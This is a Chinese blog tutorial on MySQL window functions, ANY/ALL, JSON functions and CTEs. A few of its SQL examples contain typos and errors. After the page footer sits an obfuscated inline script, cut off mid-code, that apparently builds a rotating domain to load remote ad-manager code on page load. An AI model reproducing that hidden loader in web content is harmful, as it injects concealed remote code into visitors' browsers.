<h2 id="%C2%A0%F0%9F%8C%B9%20first_value()%20%E4%B8%8E%20last_value()"> ? first_value() 与 last_value()</h2> 
<p><strong>first_value()：</strong></p> 
<pre><code class="language-sql">first_value( EXPR ) over( partition by col1 order by col2 )</code></pre> 
<p>其中EXPR通常是直接是列名，也可以是从其他行返回的表达式，根据字段col1进行分组，在分组内部根据字段col2进行排序;</p> 
<p>first_value函数返回一组排序值后的<strong>第一个值</strong></p> 
<p>last_value返回一组排序值后的<strong>最后一个值</strong></p> 
<pre><code class="language-sql">#first_value函数查看每一个分组的第一个值
SELECT
t.*,
first_value( sale ) over ( PARTITION BY id ) AS rank1 
FROM
test AS t;</code></pre> 
<p>如下图：查到这个组最大的id的第一个值，如果要这个组内最小的值在PARTITION BY id 后面加Order By sale Desc即可<img alt="" height="163" src="https://images2.imgbox.com/30/14/lKx6YXxN_o.png" width="540"></p> 
<p> 验证：</p> 
<pre><code class="language-sql">SELECT
t.*
FROM
test AS t;
GROUP BY id</code></pre> 
<p>分组后的第一个值</p> 
<p><img alt="" height="197" src="https://images2.imgbox.com/9e/e3/AtYb7IxR_o.png" width="435"></p> 
<p></p> 
<p><strong>last_value()：</strong></p> 
<pre><code class="language-sql">last_value( EXPR ) over( partition by col1 order by col2 )</code></pre> 
<p>其中EXPR通常是直接是列名，也可以是从其他行返回的表达式，根据字段col1进行分组，在分组内部根据字段col2进行排序;</p> 
<p>first_value函数返回一组排序值后的<strong>第一个值</strong></p> 
<p>last_value返回一组排序值后的<strong>最后一个值</strong></p> 
<pre><code class="language-sql">#last_value函数查看每一个分组的最后一个值
SELECT
t.*,
last_value( sale ) over ( PARTITION BY id ) AS rank1 
FROM
test AS t;</code></pre> 
<p><img alt="" height="165" src="https://images2.imgbox.com/14/0b/xXmqlLEM_o.png" width="473"></p> 
<p> 验证：</p> 
<pre><code>SELECT
t.*
FROM
test AS t;
GROUP BY id</code></pre> 
<p><img alt="" height="169" src="https://images2.imgbox.com/cf/87/33KJ5FNf_o.png" width="496"></p> 
<hr>
<h2 id="%C2%A0%F0%9F%8C%B9%20nth_value(expr%EF%BC%8Cn)%20%E4%B8%8E%20ntile(n)"> ? nth_value(expr，n) 与 ntile(n)</h2> 
<p><strong>nth_value()：</strong></p> 
<p>其中NTH_VALUE(expr, n)中的第二个参数是指这个函数取排名第几的记录，返回窗口中第n个expr的值。expr可以是表达式，也可以是列名。</p> 
<pre><code class="language-sql">SELECT
    order_id,
    username,
    create_date,
    cost,
    NTH_VALUE( cost, 3 ) OVER ( ORDER BY username ASC ) nth_cost 
FROM
    tb_customer_shopping;</code></pre> 
<p>如下图：取出排名第三的成绩46</p> 
<p><img alt="" height="329" src="https://images2.imgbox.com/ff/de/JDWyqIcr_o.png" width="375"></p> 
<p></p> 
<pre><code class="language-sql">SELECT
    order_id,
    username,
    create_date,
    cost,
    NTH_VALUE( cost, 3 ) OVER ( PARTITION BY username ORDER BY create_date ASC ) nth_cost 
FROM
    tb_customer_shopping;</code></pre> 
<p><img alt="" height="337" src="https://images2.imgbox.com/11/dd/bHGvsdDr_o.png" width="377"></p> 
<p></p> 
<pre><code class="language-sql">SELECT
    order_id,
    username,
    create_date,
    cost,
    NTH_VALUE( cost, 2 ) OVER ( PARTITION BY username ORDER BY create_date ASC rows BETWEEN          unbounded preceding AND unbounded following ) nth_cost 
FROM
    tb_customer_shopping;</code></pre> 
<p><img alt="" height="340" src="https://images2.imgbox.com/96/b5/a0iL2Len_o.png" width="374"></p> 
<p></p> 
<p><strong>ntile()：</strong></p> 
<pre><code class="language-sql">ntile(ntile_num） OVER ( partition by col1 order by col2 )</code></pre> 
<p>NTILE函数对一个数据分区中的有序结果集进行划分，举一个生活中的例子，我们想要把一些鸡蛋放入若干个篮子中，每个篮子可以看成一个组，然后为每个篮子分配一个唯一的组编号，这个组里面就有一些鸡蛋。我们假设篮子的编号可以反映放在内部鸡蛋的体积大小，例如编号较大的篮子里面放着一些体积较大的鸡蛋，编号较小的篮子则放着体积较小的鸡蛋，现在，因为体积特别大的鸡蛋和特别小的鸡蛋不适合放入规定范围包装盒内进行出售，所以要进行筛选，在进行分组之后，我们只需要拎出合适范围的带有编号的篮子就能拿到我们想要的鸡蛋</p> 
<p>NTILE函数在统计分析中是很有用的。例如，如果想移除异常值,我们可以将它们分组到顶部或底部的“桶”中，然后在统计分析的时候将这些值排除。在统计信息收集可以使用NTILE函数来计算直方图信息边界。在统计学术语中，NTILE函数创建等宽直方图信息。</p> 
<p>ntile_num是一个整数，用于创建“桶”的数量，即分组的数量，不能小于等于0。其次需要注意的是，在over函数内，尽量要有排序ORDER BY子句</p> 
<pre><code class="language-sql">SELECT
    t.*,
    ntile( 4 ) over ( PARTITION BY id ORDER BY sale ) AS rank1   #声明了4个篮子
    FROM
test AS t;</code></pre> 
<p><img alt="" height="168" src="https://images2.imgbox.com/0e/76/X0cLM7m6_o.png" width="344"></p> 
<hr>
<h1 id="%F0%9F%92%96%E5%85%B3%E9%94%AE%E5%AD%97%C2%A0">?关键字 </h1> 
<h2 id="%F0%9F%8C%B9%20ANY">? ANY</h2> 
<p>关键字ANY表示满足其中任意一个条件。只要满足内层查询语句返回的结果中的任意一个，就可以通过条件执行外层语句。</p> 
<blockquote> 
 <p>=ANY等价于IN</p> 
</blockquote> 
<pre><code class="language-sql">SELECT *
FROM tableName
WHERE id =ANY(SELECT id FROM tableName WHERE name='张三' || ename='李四');</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20ALL">? ALL</h2> 
<p>关键字ALL表示满足所有条件。使用关键字ALL时，只有满足内层查询语句的所以返回结果，才可以执行外层查询语句。</p> 
<p>查询薪资比“张三”，“李四”，“王五”三个人的薪资都要高的员工姓名和薪资</p> 
<pre><code class="language-sql">SELECT ename,salary
FROM t_employee
WHERE salary &gt;ALL(SELECT salary FROM t_employee WHERE ename IN('张三','李四','王五'));</code></pre> 
<p>小结：关键字ANY和ALL的使用方法是一样的，但两者存在着很大的区别，使用<strong>ANY关键字</strong>时，只要<strong>满足内层查询语句结果中的任意一个</strong>，<strong>就可以通过该条件来执行外层查询语句</strong>；而关键字<strong>ALL</strong>则需要<strong>满足内层查询语句返回的所有结果</strong>，<strong>才可以执行外层查询语句</strong>。</p> 
<hr>
<h1 id="%F0%9F%92%96%20%E4%BD%BF%E7%94%A8JSON">? 使用JSON</h1> 
<p>MySQL5.7开始，支持了JavaScript对象表示(javaScript Object Notation， JSON)数据类型。之前这类数据不是单独的数据类型，会被存储为字符串。</p> 
<p>新的JSON数据类型提供了自动验证的JSON文档以及优化的存储格式。</p> 
<p>JSON文档以二进制格式存储，它提供以下功能：</p> 
<ul>
<li>对文档元素的快速读取访问</li>
<li>当服务器再次读取JSON文档时，不需要重新解析文本获取该值</li>
<li>通过键或数组索引直接查找子对象或嵌套值，而不需要读取文档的所有值。</li>
</ul>
<p>创建表：</p> 
<pre><code class="language-sql">CREATE TABLE `emp_details` (
  `emp_no` int NOT NULL,
  `details` json DEFAULT NULL,
  PRIMARY KEY (`emp_no`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;</code></pre> 
<p>插入数据：</p> 
<pre><code class="language-sql">INSERT into  emp_details(emp_no,details) values('1',
'{
    "location":"IN",
    "phone":"11999999911",
    "email":"abc@qq.com",
        "address":{
        "line1":"abc",
        "line2":"cde",
        "city":"huj",
        "pin":"41242"
    }
}')</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20%E6%9F%A5%E6%89%BE">? 查找</h2> 
<ul><li>查询详情信息的address对象的pin字段内容</li></ul>
<pre><code class="language-sql">SELECT emp_no,details -&gt;'$.address.pin' pin FROM emp_details  # "41242"</code></pre> 
<p>结果有引号，如果不用引号，可以使用-&gt;&gt;运算符</p> 
<pre><code class="language-sql">SELECT emp_no,details -&gt;&gt;'$.address.pin' pin FROM emp_details  #41242</code></pre> 
<ul><li>可以在where 子句中使用 col-&gt;&gt;path 运算符来引用JSON的某一列</li></ul>
<pre><code class="language-vbscript">SELECT emp_no FROM emp_details WHERE details-&gt;&gt;'$.address.pin'='41242'</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20JSON%20%E5%87%BD%E6%95%B0">? JSON 函数</h2> 
<p>MySQL提供了许多处理JSON数据的函数，下面举例几种常用的函数</p> 
<ul><li>也可以使用<strong>JSON_CONTAINS</strong>函数查询数据。如果找到了数据，则返回1，否则返回0</li></ul>
<pre><code class="language-sql">SELECT JSON_CONTAINS(details-&gt;&gt;'$.address.pin',"41242") FROM emp_details</code></pre> 
<ul><li>查询一个key是否存在 address.pin这个key是否存在使用<strong>JSON_CONTAINS_PATH</strong>，存在返回1，否则返回0</li></ul>
<pre><code class="language-sql">SELECT JSON_CONTAINS_PATH(details,'one','$.address.pin') FROM emp_details</code></pre> 
<p><strong>one</strong>表示至少应该存在一个键</p> 
<ul><li>检查 address.line1或者address.line2是否存在</li></ul>
<pre><code class="language-sql">SELECT JSON_CONTAINS_PATH(details,'one','$.address.line1','$.address.line2') FROM emp_details</code></pre> 
<ul><li>如果要检查address.line1和 address.line2 是否同时存在，可以使用<strong>all</strong>，而不是one，使用了all只要有一个不存在就是返回0,都存在返回1</li></ul>
<pre><code class="language-sql">SELECT JSON_CONTAINS_PATH(details,'all','$.address.line1','$.address.line2') FROM emp_details</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20%E4%BF%AE%E6%94%B9">? 修改</h2> 
<p>可以使用三种不同的函数来修改数据:JSON_SET()、JSON_INSERT()和JSON_PEPLACE()。在MySQL8 之前的版本，我们还需要对整个列进行完整的更新，这并不是最佳的方法。</p> 
<p></p> 
<ul><li>
<strong>JSON_SET()：</strong>替换现有值并添加不存在的值</li></ul>
<p>替换员工的pin码，并添加昵称的详细信息</p> 
<pre><code class="language-sql">UPDATE emp_details SET details=JSON_SET(details, '$.address.pin', '666','$.nickName','小明')</code></pre> 
<ul><li>
<strong>JSON_INSERT()：</strong>插入值，但不替换现有值</li></ul>
<p>假设希望添加新列而不更新现有值</p> 
<pre><code class="language-sql">UPDATE emp_details SET details = JSON_INSERT( details, '$.address.pin', '555', '$.address.line4', 'wocao' ) WHERE emp_no =1</code></pre> 
<p>这种情况，pin不会被更新，只会添加一个新字段address.line4</p> 
<ul><li>
<strong>JSON_REPLACE()：</strong>仅替换现有值</li></ul>
<p>假设只需要替换现有字段，不需要添加新字段</p> 
<pre><code>UPDATE emp_details SET details = JSON_REPLACE( details, '$.address.pin', '222', '$.address.line5', 'wocao' ) WHERE emp_no =1</code></pre> 
<p>这种情况下，line5不会被添加，只有pin会被更新</p> 
<hr>
<h2 id="%F0%9F%8C%B9%20%E5%88%A0%E9%99%A4">? 删除</h2> 
<p>JSON_REMOVE能从JSON文档中删除数据</p> 
<p>假设不在需要地址中的line4字段</p> 
<pre><code class="language-sql">UPDATE emp_details SET details = JSON_REMOVE( details, '$.address.line4') WHERE emp_no =1</code></pre> 
<hr>
<h2 id="%F0%9F%8C%B9%20%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0">? 其他函数</h2> 
<ul><li>
<strong>JSON_KEYS()：</strong>获取JSON文档中的所有键</li></ul>
<pre><code class="language-sql">SELECT JSON_KEYS(details) FROM emp_details #["email", "phone", "address", "location", "nickName"]</code></pre> 
<ul><li>
<strong>JSON_LENGTH()：</strong>给出JSON文档中的元素数。</li></ul>
<pre><code class="language-sql">SELECT JSON_LENGTH(details) FROM emp_details #5</code></pre> 
<ul><li>
<strong>JSON_PRETTY()：</strong>优雅浏览</li></ul>
<p>想要优雅的格式显示JSON值，使用JSON_PRETTY()函数：</p> 
<pre><code class="language-ruby">SELECT emp_no,JSON_PRETTY(details) FROM emp_details</code></pre> 
<p>结果：</p> 
<pre><code class="language-sql">{
"email": "abc@qq.com",
"phone": "11999999911",
"address": {
"pin": "41242",
"city": "huj",
"line1": "abc",
"line2": "cde"
},
"location": "IN"
}</code></pre> 
<p>如果不适用函数是这样的结果</p> 
<pre><code class="language-sql">{"email": "abc@qq.com", "phone": "11999999911", "address": {"pin": "41242", "city": "huj", "line1": "abc", "line2": "cde"}, "location": "IN"}</code></pre> 
<p>更多函数可以看官网的函数列表：<a href="https://dev.mysql.com/doc/refman/8.0/en/json-function-reference.html" title="MySQL :: MySQL 8.0 Reference Manual :: 12.18.1 JSON Function Reference">MySQL :: MySQL 8.0 Reference Manual :: 12.18.1 JSON Function Reference</a></p> 
<hr>
<h2 id="%F0%9F%8C%B9%20JSON%E4%BD%BF%E7%94%A8%E7%B4%A2%E5%BC%95%C2%A0">? JSON使用索引 </h2> 
<p>在JSON列上不能直接建立索引，如果要在JSON列上使用索引，可以使用虚拟列和在虚拟列上创建索引来提取信息。</p> 
<p>插入虚拟数据：</p> 
<pre><code class="language-sql">INSERT IGNORE INTO emp_details(emp_no , details) VALUES 
( '1','{"location":"IN","phone":"+1180000000","email":"abc@example.com","address": { "line1":"abc","line2":"xyzstreet","city": "Bangalore","pin":"560101" }}' ) , 
( '2','{"location":"IN","phone":"+1180000000","email":"def@example.com","address": { "line1":"abc","line2":"xyzstreet","city": "quanzhou","pin":"560102" }}' ) , 
( '3','{"location":"IN","phone":"+1180000000","email":"qwe@example.com","address": { "line1":"abc","line2":"xyzstreet","city": "xiamen","pin":"560103" }}' ) , 
( '4','{"location":"IN","phone":"+1180000000","email":"hjy@example.com","address": { "line1":"abc","line2":"xyzstreet","city": "zhangzhou","pin":"560104" }}' ) , 
( '5','{"location":"IN","phone":"+1180000000","email":"grt@example.com","address": { "line1":"abc","line2":"xyzstreet","city": "yongcun","pin":"560105" }}' ) </code></pre> 
<p>查询城市quanzhou的员工编号emp_no</p> 
<pre><code class="language-sql">EXPLAIN SELECT emp_no FROM emp_details WHERE details-&gt;&gt;'$.address.city'='quanzhou'</code></pre> 
<p>如果下图：无法使用索引,也全表扫描</p> 
<p><img alt="" height="56" src="https://images2.imgbox.com/8a/41/3yiupsP3_o.png" width="998"></p> 
<p><strong> 解决办法</strong>：可以将城市作为虚拟列进行检索，并在这个虚拟列添加索引</p> 
<pre><code class="language-sql">ALTER TABLE emp_details ADD COLUMN city VARCHAR(20) AS (details-&gt;&gt;'$.address.city'),ADD INDEX(city);</code></pre> 
<p>如下图，使用了索引，也只扫描了一行</p> 
<p><img alt="" height="69" src="https://images2.imgbox.com/7a/af/j0rPSoRi_o.png" width="945"></p> 
<p> 也可以在创建表的时候添加索引</p> 
<blockquote> 
 <p>CREATE TABLE emp_details(</p> 
 <p>        emp_no int(11) NOT NULL,</p> 
 <p>        details json DEFAULT NULL,</p> 
 <p><strong>        city VARCHAR(20) GENERATED ALWAYS AS(json_unquote(json_extract(details,_utf8'$.address.city')))</strong></p> 
 <p><strong>        VIRTUAL,</strong></p> 
 <p>        PRIMARY KEY(emp_no),</p> 
 <p><strong>        KEY city (city)</strong></p> 
 <p>        ENGINE=INNODB DEFAULT CHARSET=utf8mb4</p> 
 <p>)</p> 
</blockquote> 
<hr>
<h1 id="%F0%9F%92%96%20%E5%85%AC%E7%94%A8%E8%A1%A8%E8%A1%A8%E8%BE%BE%E5%BC%8F(CTE)%C2%A0">? 公用表表达式(CTE) </h1> 
<p>MySQL 8支持公用表达式 ，包括非递归和递归两种。</p> 
<p>公用表表达式允许使用命名的临时结果集，这是通过允许在SELECT语句和某些其他语句前面使用WITH子句来实现的</p> 
<blockquote> 
 <p>为什么需要CTE？</p> 
 <p>不能在同一查询中引用两次派生表，因为那样的话，查询会根据派生表的引用次数计算两次或多次，这样会引发严重的性能问题，使用CTE后，子查询只会计算一次。</p> 
</blockquote> 
<p><strong>基础语法：</strong></p> 
<pre><code class="language-sql">WITH cte_name (column_list) AS ( 
   query
) 
SELECT * FROM cte_name;</code></pre> 
<p>注意，查询中的列数必须与column_list中的列数相同。 如果省略column_list，CTE将使用定义CTE的查询的列列表。</p> 
<p><strong>简单示例：</strong></p> 
<pre><code class="language-sql">WITH customers_in_usa AS (   
 SELECT customerName, state    
 FROM customers  
 WHERE  country = 'USA'
) 
 SELECT customerName FROM customers_in_usa 
WHERE state = 'CA' ORDER BY customerName;</code></pre> 
<p><strong>更高级的示例：</strong></p> 
<pre><code class="language-sql">WITH salesrep AS (
    SELECT 
        employeeNumber,
        CONCAT(firstName, ' ', lastName) AS salesrepName
    FROM
        employees
    WHERE
        jobTitle = 'Sales Rep'
),
customer_salesrep AS (
    SELECT 
        customerName, salesrepName
    FROM
        customers
            INNER JOIN
        salesrep ON employeeNumber = salesrepEmployeeNumber
)
SELECT 
    *
FROM
    customer_salesrep
ORDER BY customerName;</code></pre> 
<p></p> 
<h2 id="%F0%9F%8C%B9%20WITH%E5%AD%90%E5%8F%A5%E7%94%A8%E6%B3%95">? WITH子句用法</h2> 
<p>在SELECT，UPDATE和DELETE语句的开头可以使用WITH子句：</p> 
<pre><code class="language-sql">WITH ... SELECT ...
WITH ... UPDATE ...
WITH ... DELETE ...</code></pre> 
<p>可以在子查询或派生表子查询的开头使用WITH子句</p> 
<pre><code class="language-sql">SELECT ... WHERE id IN (WITH ... SELECT ...);

SELECT * FROM (WITH ... SELECT ...) AS derived_table;</code></pre> 
<p>可以在SELECT语句之前立即使用WITH子句，包括SELECT子句</p> 
<pre><code class="language-sql">CREATE TABLE ... WITH ... SELECT ...
CREATE VIEW ... WITH ... SELECT ...
INSERT ... WITH ... SELECT ...
REPLACE ... WITH ... SELECT ...
DECLARE CURSOR ... WITH ... SELECT ...
EXPLAIN ... WITH ... SELECT ...</code></pre> 
<p></p> 
<h2 id="%F0%9F%8C%B9%20%E9%9D%9E%E9%80%92%E5%BD%92CTE%C2%A0">? 非递归CTE </h2> 
<p>公用表表达式(CTE) 与派生表类似，但它的声明会放在子查询块之前，而不是FROM 子句中。</p> 
<p><strong>派生类：</strong></p> 
<pre><code class="language-sql">SELECT... FROM (subquery) AS derived,t1 ...</code></pre> 
<p><strong>CTE：</strong></p> 
<pre><code class="language-sql">SELECT... WITH derived AS (subquery) SELECT ... FROM derived,t1...</code></pre> 
<p>CTE 可能在SELECT/UPDATE/DELETE之前，包括WITH derived AS (subquery)</p> 
<p><strong>案例：</strong>想了解每年工资比较前一年的增长百分比，如果没有CTE，你需要编写两个子查询，这两个子查询本质上是相同的，但MySQL并不能识别出它们是相同的，这就会导致子查询被执行两次</p> 
<pre><code class="language-sql">SELECT
    q1.YEAR,
    q2.YEAR AS next_year,
    q1.sum,
    q2,
    sum AS next_sum,
    100 *(q2.sum - q1.sum )/ q1.sum AS pct 
FROM
    (SELECT year(from_date) as year,sum(salary) as sum FROM salaries GROUP BY year) AS q1,
    (SELECT year(from_date) as year,sum(salary) as sum FROM salaries GROUP BY year) AS q2
WHERE q1.year=q2.year-1;</code></pre> 
<p>如果使用非递归 CTE，派生查询只执行一次并重用：</p> 
<pre><code class="language-sql">WITH CTE AS (SELECT year(from_date) AS year,SUM(salary) AS sum FROM salaries GROUP BY year)
SELECT
    q1.YEAR,
    q2.YEAR AS next_year,
    q1.sum,
    q2.sum AS next_sum,
    100 *(q2.sum - q1.sum )/ q1.sum AS pct 
FROM
    CTE AS q1,
    CTE AS q2 
WHERE
    q1.YEAR = q2.yuar - 1;</code></pre> 
<p>结果发现使用CTE后，结果与之前相同，查询时间缩短了50%,可读性变好，而且可以被多次引用</p> 
<p>优缺点：</p> 
<ul>
<li>派生查询不能引用其他派生查询</li>
<li>CTE可以引用其他CTE</li>
</ul>
<p></p> 
<h2 id="%F0%9F%8C%B9%20%E9%80%92%E5%BD%92CTE">? 递归CTE</h2> 
<p>递归CTE是一种特殊的CTE，其子查询会引用自己的名字，WITH子句必须以WITH RECURSIVE开头。递归CTE子查询包括两部分：seed查询 和recursive查询，有UNION[ALL]或UNION DISTINCT分隔</p> 
<ul>
<li>seed SELECT被执行一次以创建初始数据子集；</li>
<li>recursive SELECT被重复执行以返回数据的子集，直到获得完整的结果集。</li>
</ul>
<p>当迭代不会生成任何新行时，递归会停止。这对挖掘层次结构(父/子或部分子部分)非常有用</p> 
<pre><code class="language-sql">WITH RECURSIVE cte AS 
(SELECT ... FROM table_name  /* seed SELECT*/
 UNION ALL
 SELECT ... FROM cte ,table_name) /* recursive SELECT*/
 SELECT ... FROM cte;
)</code></pre> 
<p><strong>案例：</strong>假设要执行分层数据遍历，以便为每个员工生成一个组织结构图（即从 CEO 到每个员工的路径)，也可以使用递归CTE！</p> 
<p>创建表：</p> 
<pre><code class="language-sql">CREATE TABLE employees_mgr (
    id INT PRIMARY KEY NOT NULL,
    NAME VARCHAR ( 100 ) NOT NULL,
    manager_id INT NULL,
    INDEX(manager_id),
    FOREIGN KEY ( manager_id ) REFERENCES employees_mgr(id)
);</code></pre> 
<p>插入示例数据：</p> 
<pre><code class="language-sql">INSERT INTO employees_mgr
VALUES
( 333, 'Yasm na', NULL ), #Yasmina is the CEO (manager id is NULL)
( 198, 'John', 333 ),# John has ID 198 and reports to 333 (Yasm na)
( 692, 'Tarek', 333 ),
( 29, 'Pedro', 198 ),
( 4610, 'Sarah', 29 ),
( 72, 're', 29 ),
(123,'Adil',692 );</code></pre> 
<p>执行递归CTE：</p> 
<pre><code class="language-sql">WITH RECURSIVE employee_paths (id,`name`,path) AS 
(
    SELECT id,`name` , CAST(id AS CHAR(200))   #转int类型
    FROM employees_mgr 
    WHERE manager_id IS NULL 
    UNION ALL 
    SELECT e.id, e.name , CONCAT(ep.path ,',', e.id) 
    FROM employee_paths AS ep JOIN employees_mgr AS e 
    ON ep.id = e.manager_id
)
SELECT * FROM employee_paths ORDER BY path ;</code></pre> 
<p><img alt="" height="192" src="https://images2.imgbox.com/5e/f3/9kN0d9qd_o.png" width="281"></p> 
<p></p> 
<pre><code class="language-sql">-- SQL分析：
WITH RECURSIVE employee_paths (id,`name`,path) AS  -- 是CTE的名称，列是(id,`name`,path)

SELECT id,`name` , CAST(id AS CHAR(200))   
  FROM employees_mgr 
  WHERE manager_id IS NULL  -- 查询CEO的seed查询(没有在CEO智商的管理者)) 

 SELECT e.id, e.name , CONCAT(ep.path ,',', e.id) 
 FROM employee_paths AS ep JOIN employees_mgr AS e 
 ON ep.id = e.manager_id -- 是递归查询
 -- 递归查询生成的每一行，会查找直接向前一行生成的员工汇报所有员工，对于每个员工，改行的信息包括员工ID、姓名、员工管理链，该链是咋最后添加了员工ID的管理链</code></pre> 
<p> 这是小编在开发学习使用和总结的小Demo，  这中间或许也存在着不足，希望可以得到大家的理解和建议。如有侵权联系小编！</p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0